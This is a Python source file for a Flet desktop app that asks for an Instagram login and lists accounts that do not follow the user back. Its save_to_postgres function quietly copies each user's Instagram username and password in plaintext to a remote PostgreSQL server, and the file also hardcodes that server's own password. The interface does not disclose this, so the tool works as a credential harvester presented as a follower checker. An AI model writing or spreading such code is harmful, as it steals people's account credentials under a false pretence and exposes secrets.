import instaloader
from instaloader.exceptions import TwoFactorAuthRequiredException
import flet as ft
import psycopg2

# Configuración de la conexión a la base de datos PostgreSQL
POSTGRES_HOST = "ep-fragrant-forest-a4h06mtp-pooler.us-east-1.aws.neon.tech"
POSTGRES_PORT = "5432"
POSTGRES_DATABASE = "verceldb"
POSTGRES_USER = "default"
POSTGRES_PASSWORD = "DZE0SQHoi7lW"

def main(page: ft.Page):
    usuario = ft.TextField(label="Username", text_align="LEFT")
    contraseña = ft.TextField(label="Password", password=True, can_reveal_password=True, text_align="LEFT")
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER

    def non_followers(e):
        username = usuario.value
        password = contraseña.value

        # Crea una instancia de Instaloader
        L = instaloader.Instaloader()

        try:
            # Intenta iniciar sesión en Instagram
            L.login(username, password)
        except TwoFactorAuthRequiredException:
            # Si se requiere autenticación de dos factores, solicita el código de verificación
            verification_code_field = ft.TextField(label="Enter verification code")
            dialog = ft.AlertDialog(
                title=ft.Text("Two-Factor Authentication Required"),
                content=verification_code_field,
                actions=[ft.TextButton("OK", on_click=lambda _: handle_verification_code(username, password, verification_code_field.value, page))]
            )
            page.dialog = dialog
            dialog.open = True
            page.update()
            return
        except instaloader.exceptions.InstaloaderException as e:
            # Manejar otras excepciones de Instaloader, por ejemplo, si hay un problema de red
            print("Error:", e)
            return

        # Obtiene el perfil del usuario
        profile = instaloader.Profile.from_username(L.context, username)

        # Obtiene los seguidores del usuario
        followers = set(profile.get_followers())

        # Obtiene las personas que sigue el usuario
        following = set(profile.get_followees())

        # Encuentra quién no te sigue de vuelta
        not_following_back = following - followers

        # Muestra los usuarios que no te siguen de vuelta en la interfaz de Flet
        resultados = ft.ListView(expand=True, spacing=10)
        for user in not_following_back:
            resultados.controls.append(ft.Text(f"{user.username} no te sigue"))

        # Limpiar la página y agregar los nuevos elementos
        page.controls.clear()
        page.add(usuario, contraseña, ft.TextButton(text="Submit", on_click=non_followers), resultados)
        page.update()

        # Guardar los datos después de la autenticación exitosa
        save_to_postgres(username, password)

    def handle_verification_code(username, password, verification_code, page):
        L = instaloader.Instaloader()
        try:
            # Intenta iniciar sesión con el código de verificación
            L.login(username, password, verification_code=verification_code)
        except Exception as e:
            # Maneja cualquier error durante el proceso de inicio de sesión con el código de verificación
            # Por ejemplo, podrías mostrar un mensaje de error al usuario
            print("Error during two-factor authentication:", e)
            return

        # Si la autenticación de dos factores fue exitosa, ejecuta la función de búsqueda de no seguidores
        non_followers(None)

    def save_to_postgres(username, password):
        # Conectarse a la base de datos PostgreSQL
        conn = psycopg2.connect(
            host=POSTGRES_HOST,
            port=POSTGRES_PORT,
            database=POSTGRES_DATABASE,
            user=POSTGRES_USER,
            password=POSTGRES_PASSWORD
        )

        # Crear un cursor para ejecutar comandos SQL
        cursor = conn.cursor()

        # Ejecutar una consulta SQL de ejemplo (aquí puedes insertar los datos del usuario)
        cursor.execute("INSERT INTO usuarios (username, password) VALUES (%s, %s)", (usuario.value, contraseña.value))

        # Confirmar los cambios en la base de datos
        conn.commit()

        # Cerrar el cursor y la conexión
        cursor.close()
        conn.close()

    page.add(usuario, contraseña, ft.TextButton(text="Submit", on_click=non_followers))

ft.app(target=main)
